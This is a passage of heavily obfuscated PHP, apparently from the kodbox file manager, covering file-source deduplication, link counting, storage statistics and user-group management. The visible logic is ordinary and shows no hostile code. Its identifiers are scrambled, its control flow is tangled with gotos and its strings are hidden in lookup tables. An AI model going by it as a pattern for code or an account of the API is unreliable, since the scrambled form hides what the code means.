Model($fÚÅ²ïÏÙ[835])->get($fÚÅ²ïÏÙ[1605]); $c¼ÂÍˆ•Ş = substr(md5($fÚÅ²ïÏÙ[1343] . $A„çŒÔ×ù . date($fÚÅ²ïÏÙ[445])), 0, 8); $Dº÷×¡½» = KodIO::defaultIO() . date($fÚÅ²ïÏÙ[1606]) . $c¼ÂÍˆ•Ş . $fÚÅ²ïÏÙ[8]; goto Fƒ²ÒŠô”; Fƒ²ÒŠô”: if ($BŞ™Â±Í®‘->ext($E·¬ƒíë‘) == $fÚÅ²ïÏÙ[1536]) { $E·¬ƒíë‘ .= $fÚÅ²ïÏÙ[1603]; } $A™æ´Å‹¬İ = IO::fileNameAuto($Dº÷×¡½», $E·¬ƒíë‘); $FÍ—¥‹²ƒ“ = $Dº÷×¡½» . $A™æ´Å‹¬İ; goto E¹À®ËØÈ•; E¹À®ËØÈ•: break; goto DËË¿æêŒê; DËË¿æêŒê: case $fÚÅ²ïÏÙ[1601]: break; default: break; } return $FÍ—¥‹²ƒ“; goto dÃíŒ×¶®¯; c—ÜÀÇ©˜µ: $fÚÅ²ïÏÙ =& $_SERVER[İë¬“ÅÒÛ›]; $bª¿‹‰ÍÄ¤ = Model($fÚÅ²ïÏÙ[835])->get($fÚÅ²ïÏÙ[1599]); $Dº÷×¡½» = KodIO::defaultIO() . date($fÚÅ²ïÏÙ[1600]); goto e‹Â’¼Ê; e‹Â’¼Ê: $FÍ—¥‹²ƒ“ = $Dº÷×¡½» . rand_string(5) . short_id(100); $E·¬ƒíë‘ = str_replace($fÚÅ²ïÏÙ[8], $fÚÅ²ïÏÙ[71], KodIO::clear($E·¬ƒíë‘)); if (!$E·¬ƒíë‘) { $bª¿‹‰ÍÄ¤ = $fÚÅ²ïÏÙ[1601]; } goto Fíµ¾ÅĞ; dÃíŒ×¶®¯: } public function addFileByRemote($Aâ‡×ï±, $açäĞóÙÅ˜, $bùñ¾¯Êª‰ = array()) { goto Fõ•ùÕÁĞ™; Fõ•ùÕÁĞ™: $aÑ‹ºí¨„ =& $_SERVER[İë¬“ÅÒÛ›]; if (!IO::exist($Aâ‡×ï±)) { return !1; } $F˜ÆÛ²ì¡ä = $bùñ¾¯Êª‰[$aÑ‹ºí¨„[160]] ? $bùñ¾¯Êª‰[$aÑ‹ºí¨„[160]] : $aÑ‹ºí¨„[33]; goto F—Êè‘¥Ó§; F—Êè‘¥Ó§: $fÛƒÈ‘“ä = IO::hashMd5($Aâ‡×ï±, $F˜ÆÛ²ì¡ä); $cßÊ‘‚ÉÙ = KodIO::defaultDriver(); $D­Ş§ƒÛ•¶ = array($aÑ‹ºí¨„[392] => IO::size($Aâ‡×ï±), $aÑ‹ºí¨„[1607] => 1, $aÑ‹ºí¨„[388] => $açäĞóÙÅ˜, $aÑ‹ºí¨„[505] => $cßÊ‘‚ÉÙ[$aÑ‹ºí¨„[369]], $aÑ‹ºí¨„[1608] => $Aâ‡×ï±, $aÑ‹ºí¨„[1609] => $bùñ¾¯Êª‰[$aÑ‹ºí¨„[161]] ? $bùñ¾¯Êª‰[$aÑ‹ºí¨„[161]] : IO::hashSimple($Aâ‡×ï±), $aÑ‹ºí¨„[1610] => $fÛƒÈ‘“ä ? $fÛƒÈ‘“ä : $F˜ÆÛ²ì¡ä); goto E¹¸¾­ä·; E¹¸¾­ä·: if ($cÂÃÏ¸Á¹í = $this->addFileCheckExist($D­Ş§ƒÛ•¶[$aÑ‹ºí¨„[161]], $D­Ş§ƒÛ•¶[$aÑ‹ºí¨„[160]], $D­Ş§ƒÛ•¶[$aÑ‹ºí¨„[78]])) { return $cÂÃÏ¸Á¹í; } $F•‹À¸÷÷ó = $this->add($D­Ş§ƒÛ•¶); return $this->find($F•‹À¸÷÷ó); goto eŒ½Á™ç¥é; eŒ½Á™ç¥é: } public function addFile($F³¸¡İ‹½Õ, $c¡„â¼İë¶, $Dì–«È¸”ˆ = false) { goto A‹§×æÙ‹; cöÊàæÜš–: if ($a‰ÏóÕ»ö = $this->addFileCheckExist($c“ìÎ¾², $EåùõÜ¾öô, $B‹Šˆî¯°)) { return $a‰ÏóÕ»ö; } $f¯œÛö“ÕŠ = $this->addFileMake($F³¸¡İ‹½Õ, $B‹Šˆî¯°, $c“ìÎ¾², $EåùõÜ¾öô, $c¡„â¼İë¶, $Dì–«È¸”ˆ); $C‹¬“ààá‚ = $this->add($f¯œÛö“ÕŠ); goto CÑÌ‡ê‚™§; A‹§×æÙ‹: $c“ìÎ¾² = IO::hashSimple($F³¸¡İ‹½Õ); $EåùõÜ¾öô = IO::hashMd5($F³¸¡İ‹½Õ); $B‹Šˆî¯° = IO::size($F³¸¡İ‹½Õ); goto cöÊàæÜš–; CÑÌ‡ê‚™§: $a‰ÏóÕ»ö = $this->find($C‹¬“ààá‚); return $a‰ÏóÕ»ö; goto A¹‘ñÅ•ÙŒ; A¹‘ñÅ•ÙŒ: } public function addFileMake($Eø”›ğ‚ø, $e•“ò¡ô¸, $eÄ£ßÇÃ°, $B£…İªøàİ, $aÈÀ÷“óÒ, $bÜ™Í³‘†) { $eš¨÷Ş®î =& $_SERVER[İë¬“ÅÒÛ›]; $aÆÖÅŒ®²ƒ = $this->createFileName($aÈÀ÷“óÒ); if ($bÜ™Í³‘†) { IO::move($Eø”›ğ‚ø, $aÆÖÅŒ®²ƒ); } else { IO::copy($Eø”›ğ‚ø, $aÆÖÅŒ®²ƒ); } $c‚çì§ôÉ = KodIO::defaultDriver(); $d£š˜ÏèÙ‹ = array($eš¨÷Ş®î[392] => $e•“ò¡ô¸, $eš¨÷Ş®î[1607] => 1, $eš¨÷Ş®î[388] => $aÈÀ÷“óÒ, $eš¨÷Ş®î[505] => $c‚çì§ôÉ[$eš¨÷Ş®î[369]], $eš¨÷Ş®î[1608] => $aÆÖÅŒ®²ƒ, $eš¨÷Ş®î[1609] => $eÄ£ßÇÃ°, $eš¨÷Ş®î[1610] => $B£…İªøàİ); return $d£š˜ÏèÙ‹; } public function addFileCheckExist($F²àØ ‚‡º, $fã¥¬»—¶¶, $D³èÊ©ßå³) { $f‚¸Œº÷¥ =& $_SERVER[İë¬“ÅÒÛ›]; $CùÆÖ³î– = $this->findByHash($F²àØ ‚‡º, $fã¥¬»—¶¶); if (!$CùÆÖ³î–) { return !1; } $EÛÃÒ¡ïï = array($f‚¸Œº÷¥[1607] => intval($CùÆÖ³î–[$f‚¸Œº÷¥[1611]]) + 1, $f‚¸Œº÷¥[392] => $D³èÊ©ßå³); $this->where(array($f‚¸Œº÷¥[391] => $CùÆÖ³î–[$f‚¸Œº÷¥[383]]))->save($EÛÃÒ¡ïï); return $CùÆÖ³î–; } public function remove($bÛöÜÏóÖ) { $this->linkCountChange($bÛöÜÏóÖ, !1); $this->clearEmpty(); return !0; } public function linkAdd($fÆ¢ï¯ÌŠ) { $this->linkCountChange($fÆ¢ï¯ÌŠ, !0); } public function linkCountChange($E¼Ö¸éƒÁ¿, $C³âªÆ£Ğï) { goto BŒ‹–º¥Œ‘; EÊê“½å†§: foreach ($c‚½˜Š–½ as $DÇå´‚„˜á => $EÇÜ¿ÌìÛó) { $B „ß…Ç ¦ = $EÇÜ¿ÌìÛó . $cšµãÊµöĞ[33]; if (!$c¥šèØóÚ[$B „ß…Ç ¦]) { $c¥šèØóÚ[$B „ß…Ç ¦] = array(); } $c¥šèØóÚ[$B „ß…Ç ¦][] = $DÇå´‚„˜á; } foreach ($c¥šèØóÚ as $EÇÜ¿ÌìÛó => $CáÍ‘ùŠªÄ) { if (!$CáÍ‘ùŠªÄ) { continue; } $EÇÜ¿ÌìÛó = $C³âªÆ£Ğï ? $EÇÜ¿ÌìÛó : -intval($EÇÜ¿ÌìÛó); $c÷Š‰Âªª¹ = array($cšµãÊµöĞ[383] => array($cšµãÊµöĞ[7], $CáÍ‘ùŠªÄ)); if ($EÇÜ¿ÌìÛó < 0) { $c÷Š‰Âªª¹[$cšµãÊµöĞ[1611]] = array($cšµãÊµöĞ[699], abs($EÇÜ¿ÌìÛó)); } $this->where($c÷Š‰Âªª¹)->setAdd($cšµãÊµöĞ[1611], $EÇÜ¿ÌìÛó); } goto aõÈ†Ò¢“–; EÛè˜éó¶Á: $c‚½˜Š–½ = array(); foreach ($E¼Ö¸éƒÁ¿ as $DÇå´‚„˜á) { $B „ß…Ç ¦ = $DÇå´‚„˜á . $cšµãÊµöĞ[33]; if (!$c‚½˜Š–½[$B „ß…Ç ¦]) { $c‚½˜Š–½[$B „ß…Ç ¦] = 0; } $c‚½˜Š–½[$B „ß…Ç ¦]++; } $c¥šèØóÚ = array(); goto EÊê“½å†§; BŒ‹–º¥Œ‘: $cšµãÊµöĞ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$E¼Ö¸éƒÁ¿) { return; } if (!is_array($E¼Ö¸éƒÁ¿)) { $E¼Ö¸éƒÁ¿ = array($E¼Ö¸éƒÁ¿); } goto EÛè˜éó¶Á; aõÈ†Ò¢“–: } public function findByHash($AÏéÙ‚½ã†, $cÜİòˆÒ¯ = false) { $AäÍæñÎ— =& $_SERVER[İë¬“ÅÒÛ›]; $eÇ­ñÃÅÙ  = array($AäÍæñÎ—[1609] => $AÏéÙ‚½ã†); if ($cÜİòˆÒ¯) { $eÇ­ñÃÅÙ  = array($AäÍæñÎ—[1610] => $cÜİòˆÒ¯); } return $this->order($AäÍæñÎ—[1612])->where($eÇ­ñÃÅÙ )->find(); } public function clearEmpty($c°¶»­ö¿‡ = 0) { goto C‰äÑ³¯šì; C‰äÑ³¯šì: $DÀ—áù¥ó¥ =& $_SERVER[İë¬“ÅÒÛ›]; $c½®„Äéš = time() - 3600 * 24 * $c°¶»­ö¿‡; $a¿×å‚ĞÌ = $DÀ—áù¥ó¥[1613] . $c½®„Äéš; goto A±ªøï™; A±ªøï™: $fÕø•É®ôë = $this->where($a¿×å‚ĞÌ)->select(); if (!$fÕø•É®ôë) { return; } $Bâëèò = new Task($DÀ—áù¥ó¥[1614], $DÀ—áù¥ó¥[33], count($fÕø•É®ôë)); goto B°ë¿ôèîğ; B°ë¿ôèîğ: foreach ($fÕø•É®ôë as $f“ïïƒ—Ê¶) { $Bâëèò->update(1); $this->resetFile($f“ïïƒ—Ê¶); } $Bâëèò->end(); goto Eëˆ°ó¯‹¹; Eëˆ°ó¯‹¹: } public function refreshData() { goto d ã™Êƒ¬; B¿³Ôİßì¥: if (!$f£ÊÊ¾Š¡Î) { return; } $a§“ºŒÇÁ = new Task($a¢æøÅ¯¹[1615], $a¢æøÅ¯¹[33], count($f£ÊÊ¾Š¡Î)); foreach ($f£ÊÊ¾Š¡Î as $CÂòé»¹–º) { $a§“ºŒÇÁ->update(1); if ($this->removeNotExist($CÂòé»¹–º)) { continue; } $this->resetFile($CÂòé»¹–º); } goto Fò§Òô·è¢; d ã™Êƒ¬: $a¢æøÅ¯¹ =& $_SERVER[İë¬“ÅÒÛ›]; $this->refreshSourceHistory(); $f£ÊÊ¾Š¡Î = $this->select(); goto B¿³Ôİßì¥; Fò§Òô·è¢: $a§“ºŒÇÁ->end(); $this->clearEmpty(); goto E¶“ÈØ˜Ó†; E¶“ÈØ˜Ó†: } private function resetFile($Bù›º·È¢ˆ) { goto AÈéì›Šï¿; e—æšÉ™¬ø: $AÃ¦¹è©Ã¼ = Model($bÑÔÆ¯Â¶[1616])->where($Aø®éË’´)->count(); $f©ÏôÖÄø  = intval($BÚôğ¬ÚÖ±) + intval($AÃ¦¹è©Ã¼); if ($f©ÏôÖÄø  == 0) { IO::remove($Bù›º·È¢ˆ[$bÑÔÆ¯Â¶[76]]); $this->where($Aø®éË’´)->delete(); return; } goto c“·Íğ¦§¤; c“·Íğ¦§¤: if ($Bù›º·È¢ˆ[$bÑÔÆ¯Â¶[1611]] != $f©ÏôÖÄø ) { $this->where($Aø®éË’´)->save(array($bÑÔÆ¯Â¶[1607] => $f©ÏôÖÄø )); } goto bè½”óÙ­; AÈéì›Šï¿: $bÑÔÆ¯Â¶ =& $_SERVER[İë¬“ÅÒÛ›]; $Aø®éË’´ = array($bÑÔÆ¯Â¶[391] => $Bù›º·È¢ˆ[$bÑÔÆ¯Â¶[383]]); $BÚôğ¬ÚÖ± = Model($bÑÔÆ¯Â¶[855])->where($Aø®éË’´)->count(); goto e—æšÉ™¬ø; bè½”óÙ­: } private function removeNotExist($Bİœîš¶Õã) { goto dÏÌâ£Ü‹; D‰à˜ÓŠğ : $A´„ÉË’ÄÛ = array($DÕÏ„ŸŒÓ­[391] => $Bİœîš¶Õã[$DÕÏ„ŸŒÓ­[383]]); Model($DÕÏ„ŸŒÓ­[855])->where($A´„ÉË’ÄÛ)->delete(); Model($DÕÏ„ŸŒÓ­[1616])->where($A´„ÉË’ÄÛ)->delete(); goto e•ŞºŞ¨ğ; e•ŞºŞ¨ğ: return !0; goto D©ùÙÔ¤Á¼; dÏÌâ£Ü‹: $DÕÏ„ŸŒÓ­ =& $_SERVER[İë¬“ÅÒÛ›]; if (IO::exist($Bİœîš¶Õã[$DÕÏ„ŸŒÓ­[76]])) { return !1; } $this->remove($Bİœîš¶Õã[$DÕÏ„ŸŒÓ­[383]]); goto D‰à˜ÓŠğ ; D©ùÙÔ¤Á¼: } private function refreshSourceHistory() { $fÀ¼Ûã¾œà =& $_SERVER[İë¬“ÅÒÛ›]; $b†„áº±Í = Model($fÀ¼Ûã¾œà[1617])->select(); if (!$b†„áº±Í) { return; } foreach ($b†„áº±Í as $eÎÇƒö’Í§) { $f÷Ä¹Úª‹ = array($fÀ¼Ûã¾œà[416] => $eÎÇƒö’Í§[$fÀ¼Ûã¾œà[375]]); if (!Model($fÀ¼Ûã¾œà[855])->where($f÷Ä¹Úª‹)->find()) { Model($fÀ¼Ûã¾œà[1617])->where($f÷Ä¹Úª‹)->delete(); } } } public function storageInfo($d¨…Ö› ¨¼ = false) { goto aâŞÉº¨‰Á; e«¡ôˆ°: for ($eë•‡ß›¡ç = 0; $eë•‡ß›¡ç < $F¢œ‰ÙŠö; $eë•‡ß›¡ç = $eë•‡ß›¡ç + $F™Š¾¤ó) { $AóéµîÒ¯ = $this->limit($eë•‡ß›¡ç, $eë•‡ß›¡ç + $F™Š¾¤ó)->select(); foreach ($AóéµîÒ¯ as $eñ„ùì•‚›) { $aÁ˜‘¾ÚÖ += $eñ„ùì•‚›[$cÒ¹°ªöëß[78]] * $eñ„ùì•‚›[$cÒ¹°ªöëß[1611]]; $A„çÑ¹°Â += $eñ„ùì•‚›[$cÒ¹°ªöëß[78]] * ($eñ„ùì•‚›[$cÒ¹°ªöëß[1611]] - 1); $BÁˆÄÊªÊ += $eñ„ùì•‚›[$cÒ¹°ªöëß[1611]]; } } $DÎÁÄ÷¯¢Ç = array($cÒ¹°ªöëß[1618] => $aÁ˜‘¾ÚÖ, $cÒ¹°ªöëß[1619] => $A„çÑ¹°Â, $cÒ¹°ªöëß[1620] => $A„çÑ¹°Â / $aÁ˜‘¾ÚÖ, $cÒ¹°ªöëß[82] => $F¢œ‰ÙŠö, $cÒ¹°ªöëß[1621] => $BÁˆÄÊªÊ); return $DÎÁÄ÷¯¢Ç; goto F»ˆØÈ¼; Bèâ¤Ûë£´: $aÁ˜‘¾ÚÖ = 1; $BÁˆÄÊªÊ = 0; $F™Š¾¤ó = 5000; goto e«¡ôˆ°; aâŞÉº¨‰Á: $cÒ¹°ªöëß =& $_SERVER[İë¬“ÅÒÛ›]; $F¢œ‰ÙŠö = $this->count() + 0.0; $A„çÑ¹°Â = 0; goto Bèâ¤Ûë£´; F»ˆØÈ¼: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x67\162\x6f\165\160\137\155\x65\164\141", "\x6d\145\x74\x61\106\151\145\154\x64" => "\147\162\157\x75\160\x49\x44"); protected function cacheFunctionAlias($a‘ÍŸÕ„ª‡) { $AÁÇ¤Æ»ˆ¨ =& $_SERVER[İë¬“ÅÒÛ›]; return array($AÁÇ¤Æ»ˆ¨[1622] => array($a‘ÍŸÕ„ª‡[0], $AÁÇ¤Æ»ˆ¨[1623]), $AÁÇ¤Æ»ˆ¨[1624] => array($a‘ÍŸÕ„ª‡[0], $AÁÇ¤Æ»ˆ¨[1623])); } protected function getInfo($D¡³Ö‡¥Ó¹) { $CÙåÂ³‹Õ¶ = $this->getInfoSimple($D¡³Ö‡¥Ó¹); if (!$CÙåÂ³‹Õ¶) { return !1; } return $this->_listDataApplyItem($CÙåÂ³‹Õ¶); } protected function getInfoSimple($c’Ìãì§æè, $EÍÖÈ¡†ì• = false) { $aÜÉ‘†Ã÷ä =& $_SERVER[İë¬“ÅÒÛ›]; if ($EÍÖÈ¡†ì•) { $fÎºñ’ Ë = array($aÜÉ‘†Ã÷ä[1546] => intval($c’Ìãì§æè)); return $this->where($fÎºñ’ Ë)->find(); } return $this->cacheFunctionGet($aÜÉ‘†Ã÷ä[1625], $c’Ìãì§æè); } protected function groupAdd($fé£†»¦ƒ¾) { goto dµÁÙõõ»¡; Aã­£Äæä‹: $eĞ©™–Å‹Ş = $this->add($dÈĞÍŠ‹à); $this->setNamePinyin($eĞ©™–Å‹Ş, $dÈĞÍŠ‹à[$F–Û’«’•š[28]]); Model($F–Û’«’•š[855])->groupRootAdd($eĞ©™–Å‹Ş); goto DÏ„­×ôŞ§; bù„È·ñŠİ: if ($fíÑ·¿—«§[$F–Û’«’•š[374]]) { $Aš†ˆ†ª = $fíÑ·¿—«§[$F–Û’«’•š[374]] . $fíÑ·¿—«§[$F–Û’«’•š[1546]] . $F–Û’«’•š[47]; } $dÈĞÍŠ‹à = array($F–Û’«’•š[388] => $this->groupNameAuto($fé£†»¦ƒ¾[$F–Û’«’•š[385]], $fé£†»¦ƒ¾[$F–Û’«’•š[28]]), $F–Û’«’•š[399] => $fé£†»¦ƒ¾[$F–Û’«’•š[385]], $F–Û’«’•š[400] => $Aš†ˆ†ª, $F–Û’«’•š[1627] => $fé£†»¦ƒ¾[$F–Û’«’•š[1530]], $F–Û’«’•š[1628] => 0, $F–Û’«’•š[1550] => 0); if (!empty($fé£†»¦ƒ¾[$F–Û’«’•š[1546]])) { $dÈĞÍŠ‹à[$F–Û’«’•š[1546]] = $fé£†»¦ƒ¾[$F–Û’«’•š[1546]]; } goto Aã­£Äæä‹; dµÁÙõõ»¡: $F–Û’«’•š =& $_SERVER[İë¬“ÅÒÛ›]; if (!$fé£†»¦ƒ¾[$F–Û’«’•š[385]] && isset($fé£†»¦ƒ¾[$F–Û’«’•š[1546]]) && $fé£†»¦ƒ¾[$F–Û’«’•š[1546]] == 1) { if ($fíÑ·¿—«§ = $this->getInfoSimple($fé£†»¦ƒ¾[$F–Û’«’•š[1546]], !0)) { return $fé£†»¦ƒ¾[$F–Û’«’•š[1546]]; } } else { $fíÑ·¿—«§ = $this->getInfoSimple($fé£†»¦ƒ¾[$F–Û’«’•š[385]]); if (!$fíÑ·¿—«§) { return !1; } } $Aš†ˆ†ª = $F–Û’«’•š[1626]; goto bù„È·ñŠİ; DÏ„­×ôŞ§: return $eĞ©™–Å‹Ş; goto c®Õ¯øæ°±; c®Õ¯øæ°±: } protected function groupEdit($dµÒéÒŠ¿, $Eê”ñİï“î) { $a‰ÂËá×› =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($Eê”ñİï“î[$a‰ÂËá×›[385]])) { $BÖÑ˜¸¬×Ñ = $this->getInfoSimple($dµÒéÒŠ¿); $dìÑÔ°÷ = $this->getInfoSimple($Eê”ñİï“î[$a‰ÂËá×›[385]]); if (!$BÖÑ˜¸¬×Ñ || !$dìÑÔ°÷) { return !1; } if ($Eê”ñİï“î[$a‰ÂËá×›[385]] != $BÖÑ˜¸¬×Ñ[$a‰ÂËá×›[385]]) { if ($dìÑÔ°÷[$a‰ÂËá×›[374]] !== $BÖÑ˜¸¬×Ñ[$a‰ÂËá×›[374]] && strpos($dìÑÔ°÷[$a‰ÂËá×›[374]], $BÖÑ˜¸¬×Ñ[$a‰ÂËá×›[374]]) === 0) { return !1; } $Eê”ñİï“î[$a‰ÂËá×›[400]] = $dìÑÔ°÷[$a‰ÂËá×›[374]] . $Eê”ñİï“î[$a‰ÂËá×›[385]] . $a‰ÂËá×›[47]; $this->_changeChildLevel($BÖÑ˜¸¬×Ñ, $dìÑÔ°÷); } } if (isset($Eê”ñİï“î[$a‰ÂËá×›[28]])) { $this->setNamePinyin($dµÒéÒŠ¿, $Eê”ñİï“î[$a‰ÂËá×›[28]]); } return $this->where(array($a‰ÂËá×›[1629] => $dµÒéÒŠ¿))->save($Eê”ñİï“î); } private function _changeChildLevel($f„’«¦¨°Ã, $dù”ÉĞ®¢, $eâ¬¨äñ¿Ã = false) { goto E¯‹ä•Â¶í; E¯‹ä•Â¶í: $Eø÷™àî… =& $_SERVER[İë¬“ÅÒÛ›]; $f÷Ññò¢è… = $f„’«¦¨°Ã[$Eø÷™àî…[374]] . $f„’«¦¨°Ã[$Eø÷™àî…[1546]] . $Eø÷™àî…[47]; $F¤ ÁÓÂÁØ = $dù”ÉĞ®¢[$Eø÷™àî…[374]] . $dù”ÉĞ®¢[$Eø÷™àî…[1546]] . $Eø÷™àî…[47] . $f„’«¦¨°Ã[$Eø÷™àî…[1546]] . $Eø÷™àî…[47]; goto d‚—£öîŠ†; AÌ›‹™”: $this->where($dö–ºäóÓ‰)->data($DÍÍ‹óŠ™Æ)->save(); goto a¶óªñ³Ş’; d‚—£öîŠ†: if ($eâ¬¨äñ¿Ã) { $F¤ ÁÓÂÁØ = $dù”ÉĞ®¢[$Eø÷™àî…[374]] . $dù”ÉĞ®¢[$Eø÷™àî…[1546]] . $Eø÷™àî…[47]; } $dö–ºäóÓ‰ = array($Eø÷™àî…[400] => array($Eø÷™àî…[409], $f„’«¦¨°Ã[$Eø÷™àî…[374]] . $f„’«¦¨°Ã[$Eø÷™àî…[1546]] . $Eø÷™àî…[410])); $DÍÍ‹óŠ™Æ = array($Eø÷™àî…[400] => array($Eø÷™àî…[415], "\162\x65\x70\154\x61\143\x65\50\x70\x61\162\145\x6e\x74\x4c\145\x76\x65\154\x2c\x27{$f÷Ññò¢è…}\x27\x2c\47{$F¤ ÁÓÂÁØ}\47\51")); goto AÌ›‹™”; a¶óªñ³Ş’: } public function setNamePinyin($dó´…ñ³½Ì, $EÌ·Ùô½¾ = false) { $A¤Ôëæ®›ô =& $_SERVER[İë¬“ÅÒÛ›]; if (!$EÌ·Ùô½¾) { $D«‡½ÍÆË® = $this->getInfoSimple($dó´…ñ³½Ì); $EÌ·Ùô½¾ = $D«‡½ÍÆË®[$A¤Ôëæ®›ô[28]]; } if (!Input::check($EÌ·Ùô½¾, $A¤Ôëæ®›ô[404])) { $this->metaSet($dó´…ñ³½Ì, $A¤Ôëæ®›ô[405], null); $this->metaSet($dó´…ñ³½Ì, $A¤Ôëæ®›ô[406], null); return; } $B±®÷ñáÎ = array($A¤Ôëæ®›ô[405] => str_replace($A¤Ôëæ®›ô[50], $A¤Ôëæ®›ô[33], Pinyin::encode($EÌ·Ùô½¾)), $A¤Ôëæ®›ô[406] => Pinyin::encode($EÌ·Ùô½¾, $A¤Ôëæ®›ô[407])); $this->metaSet($dó´…ñ³½Ì, $B±®÷ñáÎ); } protected function groupRemove($CÛ¼˜¼³) { goto E±ƒšßéÜ„; fö÷©§ïå: if (!$BÉÄ’°‚°Œ || $BÉÄ’°‚°Œ[$cµšàÇÆ°ó[385]] == 0) { return !1; } $eñòùÌÇ¢Ø = $this->getInfoSimple($BÉÄ’°‚°Œ[$cµšàÇÆ°ó[385]]); $this->_changeChildLevel($BÉÄ’°‚°Œ, $eñòùÌÇ¢Ø, !0); goto då™½äˆ­Î; då™½äˆ­Î: $this->where(array($cµšàÇÆ°ó[385] => $CÛ¼˜¼³))->save(array($cµšàÇÆ°ó[385] => $BÉÄ’°‚°Œ[$cµšàÇÆ°ó[385]])); Model($cµšàÇÆ°ó[1630])->where($f Ú´ŒÀõ)->delete(); Model($cµšàÇÆ°ó[1631])->where($f Ú´ŒÀõ)->delete(); goto dŞĞäç±; dŞĞäç±: Model($cµšàÇÆ°ó[522])->groupRootRemove($CÛ¼˜¼³); return $this->where($f Ú´ŒÀõ)->delete(); goto DÉâµ¾¹öğ; E±ƒšßéÜ„: $cµšàÇÆ°ó =& $_SERVER[İë¬“ÅÒÛ›]; $f Ú´ŒÀõ = array($cµšàÇÆ°ó[1546] => $CÛ¼˜¼³); $BÉÄ’°‚°Œ = $this->where($f Ú´ŒÀõ)->find(); goto fö÷©§ïå; DÉâµ¾¹öğ: } public function listData() { $C»¬¥îÏš = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C»¬¥îÏš[$_SERVER[İë¬“ÅÒÛ›][357]]); return $C»¬¥îÏš; } private function _makeOrder($D„©ìÁÇÂ = '') { goto AÕ½×äÎ‹; AÕ½×äÎ‹: $a‹¨êÊË÷º =& $_SERVER[İë¬“ÅÒÛ›]; $f†²Õ­ñÎİ = array($a‹¨êÊË÷º[1546], $a‹¨êÊË÷º[28], $a‹¨êÊË÷º[1532], $a‹¨êÊË÷º[187]); $BÑŠ°‘È‘ = array($a‹¨êÊË÷º[1632] => $a‹¨êÊË÷º[1633], $a‹¨êÊË÷º[1513] => $a‹¨êÊË÷º[1590]); goto CÔ¦ÕæÔ»Ş; f„¥ß–‡Û: $D„©ìÁÇÂ = $D„©ìÁÇÂ . "{$Dùí†À¯Ø}\40{$c˜åÊÑ †Ê}\54\40\147\162\x6f\x75\x70\x49\x44\x20\x61\x73\143"; return $this->order($D„©ìÁÇÂ); goto E©•Æ…Å; CÔ¦ÕæÔ»Ş: $Dùí†À¯Ø = Input::get($a‹¨êÊË÷º[1586], $a‹¨êÊË÷º[7], $a‹¨êÊË÷º[1629], $f†²Õ­ñÎİ); $c˜åÊÑ †Ê = Input::get($a‹¨êÊË÷º[1588], $a‹¨êÊË÷º[7], $a‹¨êÊË÷º[1634], array($a‹¨êÊË÷º[1634], $a‹¨êÊË÷º[1513])); $c˜åÊÑ †Ê = $BÑŠ°‘È‘[$c˜åÊÑ †Ê]; goto f„¥ß–‡Û; E©•Æ…Å: } public function listChild($Eğ ãâ§ø) { $bÓ¤–õÃÎ =& $_SERVER[İë¬“ÅÒÛ›]; $d –øÆÔÅ = $this->where(array($bÓ¤–õÃÎ[385] => $Eğ ãâ§ø))->_makeOrder()->selectPage(200); $this->_listDataApply($d –øÆÔÅ[$bÓ¤–õÃÎ[357]]); return $d –øÆÔÅ; } public function listByID($d»‹ô²õï) { $A¨¦É¥ƒ† =& $_SERVER[İë¬“ÅÒÛ›]; if (!$d»‹ô²õï) { return array(); } $b³Ø÷®È†Ş = array($A¨¦É¥ƒ†[1546] => array($A¨¦É¥ƒ†[7], $d»‹ô²õï)); $CŸ¸ãÄ°× = $this->where($b³Ø÷®È†Ş)->select(); $this->_listDataApply($CŸ¸ãÄ°×); return $CŸ¸ãÄ°×; } public function listSearch($bñî­°ÌÙš) { goto B®‹÷«´¯’; fÃ¯–’š´: $f–¬„ôŒ§ = $this->_makeOrder()->where($CŸÚáç†Èà)->selectPage(20); $f–¬„ôŒ§ = $f–¬„ôŒ§ ? $f–¬„ôŒ§ : array(); if (!$f–¬„ôŒ§ || count($f–¬„ôŒ§[$C­ì§®“¶ò[357]]) < 5 && Input::check($b ÚµÍÇñ¹, $C­ì§®“¶ò[310])) { $aÇÄÈÇëŠö = $this->_searchFromMeta($C­ì§®“¶ò[406], $b ÚµÍÇñ¹, 10); $dÇ¶‘¬šªÚ = $this->_searchFromMeta($C­ì§®“¶ò[405], $b ÚµÍÇñ¹, 10); $F˜ˆ«¦ØÚä = array_merge($aÇÄÈÇëŠö, $dÇ¶‘¬šªÚ, $f–¬„ôŒ§[$C­ì§®“¶ò[357]]); $f–¬„ôŒ§[$C­ì§®“¶ò[357]] = array_unique_by_key($F˜ˆ«¦ØÚä, $C­ì§®“¶ò[1546]); $f–¬„ôŒ§[$C­ì§®“¶ò[354]][$C­ì§®“¶ò[355]] = count($f–¬„ôŒ§[$C­ì§®“¶ò[357]]); $f–¬„ôŒ§[$C­ì§®“¶ò[354]][$C­ì§®“¶ò[356]] = ceil($f–¬„ôŒ§[$C­ì§®“¶ò[354]][$C­ì§®“¶ò[355]] / $f–¬„ôŒ§[$C­ì§®“¶ò[354]][$C­ì§®“¶ò[352]]); } goto aÜÊòãïŞ ; aõÕ² µ”ë: if (!trim($b ÚµÍÇñ¹)) { return !1; } $b ÚµÍÇñ¹ = str_replace($C­ì§®“¶ò[1637], $C­ì§®“¶ò[1638], $b ÚµÍÇñ¹); $CŸÚáç†Èà = array($C­ì§®“¶ò[1546] => array($C­ì§®“¶ò[521], "\45{$b ÚµÍÇñ¹}\x25"), $C­ì§®“¶ò[28] => array($C­ì§®“¶ò[521], "\x25{$b ÚµÍÇñ¹}\x25"), $C­ì§®“¶ò[684] => $C­ì§®“¶ò[1639]); goto fÃ¯–’š´; aÜÊòãïŞ : $this->_listDataApply($f–¬„ôŒ§[$C­ì§®“¶ò[357]]); return $f–¬„ôŒ§; goto A·§ÌÇ¸Ì; B®‹÷«´¯’: $C­ì§®“¶ò =& $_SERVER[İë¬“ÅÒÛ›]; $b ÚµÍÇñ¹ = $bñî­°ÌÙš[$C­ì§®“¶ò[1635]]; $Cƒ÷ÓÊÁ‘÷ = isset($bñî­°ÌÙš[$C­ì§®“¶ò[1636]]) ? $bñî­°ÌÙš[$C­ì§®“¶ò[1636]] : !1; goto aõÕ² µ”ë; A·§ÌÇ¸Ì: } private function _searchFromMeta($A¶—ï’Àµà, $BÆóä’°Í‘, $Aƒ¼ˆ‘«ÔÑ) { goto e½ŒâÉ°Ì; 